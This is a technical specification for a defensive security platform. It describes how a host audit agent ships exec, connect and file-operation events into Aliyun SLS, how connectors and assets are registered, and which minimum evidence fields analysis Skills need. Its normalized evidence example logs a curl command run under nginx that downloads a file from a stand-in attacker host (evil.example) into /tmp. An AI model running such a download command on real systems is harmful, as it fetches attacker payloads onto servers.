# Agent Collection Chain and Evidence Field Specification

**Languages:** English (this document) | [简体中文](12-agent-collection-and-evidence-spec.zh-CN.md)

> Supplements [data-asset-design.md](09-data-asset-design.md)  
> Describes **secweaver-agent / audit-port-execmon module → SLS** registration and **minimum evidence fields** consumed by Skills

---

## 1. Agent → SLS Collection Chain

### 1.1 Why Two Connector Types?

Host-side exec/connect/file_op data is collected by an **Agent** and **written to SLS**. The platform therefore has two connector roles:

| Role | connector_type | Purpose | Used for fetch queries? |
|---|---|---|---|
| **Collection description** | `agent_stream` | Records where Agent runs and where it writes | ❌ Not queried directly |
| **Query entry** | `sls` | project/logstore for pulling logs | ✅ fetch uses this |

**Principle**: This section uses SLS as an example. DataAsset binds a queryable storage connector: `sls` for direct SLS, `sls_proxy` for managed queries, or `es` for customer-managed ES. `agent_stream` describes collection topology and is not a fetch query entry point. See the [public self-managed ES guide](../src/tools/secweaver-agent/elasticsearch/README.md) for that alternative.

The top-level `secweaver-agent` configuration must contain the platform-issued 16-character `enterprise_id`. The shared output boundary enforces this field on every raw JSONL event for tenant isolation in a shared SLS Logstore, and modules cannot override it. `sls_proxy` strips the internal field before returning query results, so it is not part of the Skill-facing minimum Evidence schema.

```text
┌──────────────────┐     JSONL      ┌─────────────┐     ingest      ┌──────────────┐
│ secweaver-agent  │ ──────────────▶│ Aliyun SLS   │ ◀────────────── │ Other sources │
│ audit module     │                │ logstore    │                 │ (WAF/SSH…)   │
└──────────────────┘                └──────┬──────┘                 └──────────────┘
        ▲                                  │
        │ agent_stream                     │ sls (fetch)
        │ (metadata)                         ▼
 conn-agent-web-01-exec              asset-secweaver-host-exec
                                     → conn-sls-secweaver-host-events
```

### 1.2 Standard Registration Pattern (Three Files)

Example: WEB-01 host exec

| File | Type | Role |
|---|---|---|
| `connectors/conn-agent-web-01-exec.json` | `agent_stream` | Agent name, host, `sink_connector_id` |
| `connectors/conn-sls-secweaver-host-events.json` | `sls` | project, logstore=`host-exec` |
| `assets/asset-secweaver-host-exec.json` | `host_exec` | **connector_id → SLS**, not agent |

**agent_stream example** (`conn-agent-web-01-exec.json`):

```json
{
  "connector_id": "conn-agent-web-01-exec",
  "connector_type": "agent_stream",
  "credentials_ref": "vault://sls/security-readonly",
  "config": {
    "agent": "secweaver-agent",
    "module": "audit-port-execmon",
    "host": "web-01",
    "host_ip": "10.0.1.5",
    "sink": "sls",
    "sink_connector_id": "conn-sls-secweaver-host-events",
    "event_types": ["exec", "active_connect", "file_op"]
  }
}
```

**Logical asset** (`asset-secweaver-host-exec.json`) points only to SLS:

```json
{
  "asset_id": "asset-secweaver-host-exec",
  "asset_type": "host_exec",
  "connector_id": "conn-sls-secweaver-host-events",
  "query_template_ids": ["host_exec_by_host_time"]
}
```

connect / file_op follow the same pattern:

| asset_type | SLS logstore (example) | query_template |
|---|---|---|
| `host_exec` | `host-exec` | `host_exec_by_host_time` |
| `host_connect` | `host-connect` | `host_connect_by_host_time` |
| `host_file_op` | `host-file-op` | `host_file_op_by_host_time` |

### 1.3 event_type ↔ asset_type Mapping

Agent JSON written to SLS should include `event_type`, mapped to logical assets:

| Agent event_type | asset_type | SLS query filter (example) |
|---|---|---|
| `exec` | `host_exec` | `event_type: exec and host: {host}` |
| `active_connect` | `host_connect` | `event_type: active_connect and host: {host}` |
| `file_op` | `host_file_op` | `event_type: file_op and host: {host}` |

One host, three event types → **three logical assets + three SLS logstores** (or one logstore with `event_type` filter, but assets still split by type).

### 1.4 Credentials and Query Path

- **Collection**: Agent modules write local JSON Lines; Logtail, Filebeat, or the selected shipper writes them to storage.
- **Ingestion**: The shipper uses an identity with write permission scoped to the target Project/Logstore or ES index. Read-only query credentials cannot perform ingestion. Managed collection authorization comes from the installation and delivery configuration.
- **Queries**: DataAsset uses a separate read-only identity: `asset.connector_id` (or `connector_ids`) → connector → `credentials_ref` → SOPS decryption → query.
- The sample `credentials_ref` on `agent_stream` is metadata only. **Fetch does not read this connector, and this reference does not configure shipper write authorization**. Do not copy query-example credentials into ingestion configuration.


```text
fetch(asset-secweaver-host-exec)
  → conn-sls-secweaver-host-events
  → vault://sls/security-readonly
  → template host_exec_by_host_time
  → evidence_bundles.host_exec[]
```

### 1.5 Operations Checklist

1. Deploy [secweaver-agent](../src/tools/secweaver-agent/README.md) on target hosts and enable the `audit-port-execmon` module
2. Configure a shipper to ingest Agent JSONL into SLS (the project/logstore must match the query connector), and verify write permission and real events
3. Register `agent_stream` (documentation + `sink_connector_id`)
4. Register `sls` connector + three (or as needed) `host_*` assets
5. `python3 src/dataasset/validate.py` — agent not referenced by asset directly is **normal**, but `sink_connector_id` must exist

### 1.6 Common Mistakes

| Mistake | Correct approach |
|---|---|
| asset binds `conn-agent-*` | asset binds `conn-sls-*` |
| Implement agent_stream fetch driver | Use the query connector for the target storage |
| One asset mixing host_exec + connect | Split by asset_type into multiple assets |
| Forget `event_type` in SLS | Normalizer cannot route to host_exec/connect |

### 1.7 Relation to SSH Direct Read (`ssh_file`)

`ssh_auth` / `web_access_log` without SLS may use **`ssh_file` connector** for single-host log read (see [Data Asset Design §3.6](09-data-asset-design.md)).

| Path | asset binds | fetch implementation |
|---|---|---|
| Agent → SLS | `conn-sls-*` | GetLogs |
| SSH direct read | `conn-ssh-*` (`ssh_file`) | paramiko + `grep \| tail` |

Production deployments can aggregate into SLS or customer-managed ES according to capacity and operational needs. `ssh_file` reads existing logs; it does not replace Agent event collection. Reading Agent-generated JSONL still requires matching parsers, fields, and query templates, plus time-window and event-coverage validation.

### 1.8 Multi-Connector Aggregation (Same asset_type, Multiple Sources)

When one `asset_type` must pull from **multiple logstores, multiple SSH hosts, or SLS+SSH mix**, use `connector_ids` on the logical asset (see [Data Asset Design §2.2](09-data-asset-design.md)).

```text
asset-ssh-internal (ssh_auth)
  connector_ids:
    conn-sls-ssh-auth-internal      ← global aggregated logstore (no config.hostname)
    conn-sls-ssh-auth-web-01        ← per-host logstore, hostname=web-01
    conn-sls-ssh-auth-db-01         ← per-host logstore, hostname=db-01
    conn-ssh-web-01-auth            ← supplementary SSH direct read source
         │
         ▼ build_fetch_plan (template per connector)
         ▼ fetch × N → normalizer → dedupe_by → evidence_bundles.ssh_auth[]
```

| Scenario | Registration |
|---|---|
| Multiple SLS logstores (one per host) | One `conn-sls-*` per store, `config.hostname` set; one asset + `connector_ids` |
| SLS aggregate + some SSH direct | `connector_ids` mix sls + ssh_file; `query_template_ids` include SLS and SSH templates |
| Agent exec/connect | The example in §1.2 uses one storage destination; use `connector_ids` when the same event type spans multiple stores |

**Example topology and runtime capability**:

- In §1.2, each Agent event type has one logical asset querying one SLS logstore, with host filtering in the query template. This is an example deployment, not a restriction against aggregation.
- Like other assets, `host_exec` and `host_connect` can use `connector_ids` to reference multiple queryable storage Connectors. Each Connector needs a matching query template; events are normalized to the same `asset_type`, merged, and deduplicated. `agent_stream` still describes collection topology only and cannot act as a query source.
- [build_fetch_plan](../src/skills/_shared/data-access/template_select.py) selects a template for each selected Connector and creates its query plan entry. `connector_ids` describes multiple-source queries, not ordered primary/backup failover.

**Source selection by host**: The current [filter_connectors_by_host](../src/skills/_shared/data-access/aggregate.py) selects Connectors using `config.hostname` as follows:

| Condition | Connectors retained |
|---|---|
| No `params.host` | Original Connector list |
| At least one `config.hostname` matches `params.host` | All matches, followed by global sources without hostname |
| No hostname matches, including when none is bound | Original Connector list; it does not retain only global sources or return an empty list |

For example, with `params.host=web-01` and sources bound only to `web-02`, `db-01`, plus one global source, all three remain selected. If a source bound to `web-01` is also present, only that match and the global source remain. A matching template is still required to create a query plan entry.

This logic selects query sources; it does not enforce host access isolation. Actual event scope also depends on query templates and backend filtering. Verify host and time conditions in the templates, and enforce access permissions independently at the data source.

**Evidence fields**: After normalization each event has `_source_connector_id` for traceability Skills to mark data gaps. Templates chosen per connector type — see [query-templates/README.md](../dataasset/query-templates/README.md).

```bash
python3 src/dataasset/test_connector.py asset-ssh-internal --by-asset --plan \
  --params '{"attacker_ip":"203.0.113.10","host":"web-01","time_start":"...","time_end":"..."}'
```

### 1.9 Format Discovery (New Log Type Onboarding)

Only assets with **`status: discovery`** in dataasset; draft / active / disabled **do not** go through this flow.

```text
Register asset (status=discovery) → discover.py --asset-id → LLM mapping
         → update asset → discovery → draft → active → validate
```

```bash
python3 src/skills/log-format-discovery/scripts/discover.py --list-discovery
python3 src/skills/log-format-discovery/scripts/discover.py \
  --asset-id asset-waf-api-prod -i samples.jsonl --pretty
```

See [20-log-format-discovery.md](../docs_user/20-log-format-discovery.md), [log-format-discovery-design.md](20-log-format-discovery-design.md), [SKILL.md](../src/skills/log-format-discovery/SKILL.md).

---

## 2. Minimum Evidence Field Specification

### 2.1 Goal

After the Data Access Layer fetches raw logs from SLS/SSH/DB, events must normalize to **evidence events** Skills can consume.  
This spec defines **minimum required fields**; Normalizer (`after fetch`) fills `evidence_id` and unifies `timestamp`.

### 2.2 Overall Structure

Evidence container in Skill input:

```json
{
  "evidence_bundles": {
    "waf_alert": [ { "...": "..." } ],
    "host_exec": [ { "...": "..." } ]
  }
}
```

Alert confirmation additionally uses:

```json
{
  "primary_alerts": [ { "...": "..." } ],
  "correlated_evidence": {
    "web_access_log": [],
    "host_exec": [],
    "host_connect": [],
    "host_file_op": []
  }
}
```

- **Keys** = `asset_type` (same as `dataasset/assets/*.json`)
- **Values** = arrays of event objects; use `[]` when empty, do not omit keys

### 2.3 Universal Fields (All Types)

Every evidence event **must** have:

| Field | Type | Description |
|---|---|---|
| `evidence_id` | string | Platform-generated, globally unique, referenced by attack_chain `evidence_refs` |
| `timestamp` | string | ISO 8601 with timezone, e.g. `2026-06-21T09:15:22+08:00` |

Suggested `evidence_id` format from Normalizer:

```text
{asset_type_short}-{asset_id_hash}-{seq}
Example: exec-asset-secweaver-host-exec-001
```

SLS raw `__time__` / Unix seconds must convert to ISO `timestamp`.

### 2.4 Per-Type Minimum Fields

#### `waf_alert`

| Priority | Field | Notes |
|---|---|---|
| Required | `src_ip`, `timestamp`, `url`, `action` | Alert confirmation P0 |
| Strongly recommended | `payload` or `request_body` | Without these, max verdict `suspicious` |
| Recommended | `rule_id`, `rule_name`, `host`, `method` | Traceability / classification |

#### `web_access_log`

| Priority | Field | Notes |
|---|---|---|
| Required | `src_ip`, `timestamp`, `url`, `status` | |
| Recommended | `method`, `user_agent`, `host` | |

#### `host_exec`

| Priority | Field | Notes |
|---|---|---|
| Required | `host`, `timestamp`, `command` | `command` may be string or string[] |
| Strongly recommended | `event_type` = `"exec"` | Agent source data |
| Recommended | `listener_port`, `listener_process`, `cwd`, `user`, `pid` | Risk identification / traceability |

#### `host_connect`

| Priority | Field | Notes |
|---|---|---|
| Required | `host`, `timestamp`, `dst_ip`, `dst_port` | |
| Strongly recommended | `event_type` = `"active_connect"` | |
| Recommended | `pid`, `src_ip` | |

#### `host_file_op`

| Priority | Field | Notes |
|---|---|---|
| Required | `host`, `timestamp`, `path`, `action` | action: create/delete/write/… |
| Strongly recommended | `event_type` = `"file_op"` | |
| Recommended | `pid` | |

#### `ssh_auth`

| Priority | Field | Notes |
|---|---|---|
| Required | `host`, `timestamp`, `src_ip`, `user`, `result` | result: Accepted/Failed, etc. |
| Recommended | `auth_method`, `port` | |

#### `firewall_log`

| Priority | Field | Notes |
|---|---|---|
| Required | `timestamp`, `src_ip`, `dst_ip`, `action` | allow/deny, etc. |
| Recommended | `src_port`, `dst_port`, `protocol` | |

#### `network_traffic_audit`

| Priority | Field | Notes |
|---|---|---|
| Required | `timestamp`, `src_ip`, `dst_ip`, `protocol` | TCP/UDP/ICMP, etc. |
| Strongly recommended | `src_port`, `dst_port` | Five-tuple correlation |
| Recommended | `bytes`, `packets`, `application`, `session_id`, `duration`, `action` | L7 protocol, exfil volume, session aggregation |

#### `asset_inventory`

| Priority | Field | Notes |
|---|---|---|
| Required | `hostname`, `ip` | CMDB row |
| Recommended | `zone`, `owner`, `services`, `environment` | |

#### `dns_log` / `ids_alert` / `db_audit` / others

Extend in `dataasset/configure/evidence-minimum-fields.json`; minimum: `evidence_id` + `timestamp` + at least one field from that type's `schema.correlation_keys`.

### 2.5 primary_alerts (Alert Confirmation Only)

`primary_alerts[]` may omit `evidence_id` but must include:

| Field | Description |
|---|---|
| `alert_id` | Business alert ID |
| `timestamp` | Alert time |
| `src_ip` | Attack source |
| `url` | Request path |
| `action` | blocked/logged, etc. |
| `payload` or equivalent request body | Required for layer-2 success assessment |

Recommended: `source` (waf/ids), `rule_id`, `rule_name`, `host`, `method`.

### 2.6 Normalization Responsibilities (Normalizer)

Before returning to Skills, **`normalizer.py`** runs after fetch (implemented):

```text
1. Group by asset.asset_type → evidence_bundles keys
2. Write evidence_id on each event (if missing)
3. Unify timestamp to ISO 8601
4. Field alias mapping (see table below)
5. Truncate sensitive fields per asset.masking (e.g. payload truncate_500)
6. Do not write credentials, raw AK, full DSN
```

**Common alias mapping**:

| Raw (SLS/source) | Normalized |
|---|---|
| `__time__` / `@timestamp` | `timestamp` (ISO) |
| `client_ip` / `remote_addr` | `src_ip` |
| `request_uri` | `url` |
| `cmd` / `argv` | `command` |
| `dest_ip` | `dst_ip` |

### 2.7 Full Example (After Normalization)

```json
{
  "evidence_bundles": {
    "host_exec": [
      {
        "evidence_id": "exec-001",
        "event_type": "exec",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "listener_port": 443,
        "listener_process": "nginx",
        "command": ["curl", "-o", "/tmp/x", "http://evil.example/x"],
        "cwd": "/var/www/html"
      }
    ]
  },
  "query_meta": {
    "asset_id": "asset-secweaver-host-exec",
    "rows_returned": 1,
    "truncated": false
  }
}
```

### 2.8 Relation to dataasset Schema

| Location | Content |
|---|---|
| `assets/*.json` → `schema.fields` | Declares **possible columns** (completeness Skill) |
| This doc / `evidence-minimum-fields.json` | Declares **minimum columns after fetch** (Skill assessment) |
| `schema.correlation_keys` | **Deprecated**; derived from `correlation-matrix` + `schema.fields` (`correlation_keys.py`) |

Completeness analysis uses **registered_assets.fields**; traceability/alert uses **whether evidence meets this section's minimum set**.

### 2.9 Validation

`validate.py` currently validates JSON references; evidence field compliance may be added after Normalizer:

```bash
# Planned extension
python3 src/dataasset/validate.py --check-evidence sample.json
```

---

## 3. Related Files

| File | Description |
|---|---|
| [src/tools/secweaver-agent/README.md](../src/tools/secweaver-agent/README.md) | Unified Agent deployment |
| [src/tools/secweaver-agent/audit-port-execmon.example.json](../src/tools/secweaver-agent/audit-port-execmon.example.json) | audit-port-execmon module config example |
| [dataasset/connectors/conn-agent-web-01-exec.json](../dataasset/connectors/conn-agent-web-01-exec.json) | agent_stream example |
| [dataasset/configure/evidence-minimum-fields.json](../dataasset/configure/evidence-minimum-fields.json) | Machine-readable minimum fields |
| [src/skills/traceability-analysis/scripts/input.example.json](../src/skills/traceability-analysis/scripts/input.example.json) | Manual evidence sample |

---

*Document version: v1.2 | Last updated: 2026-09-16*
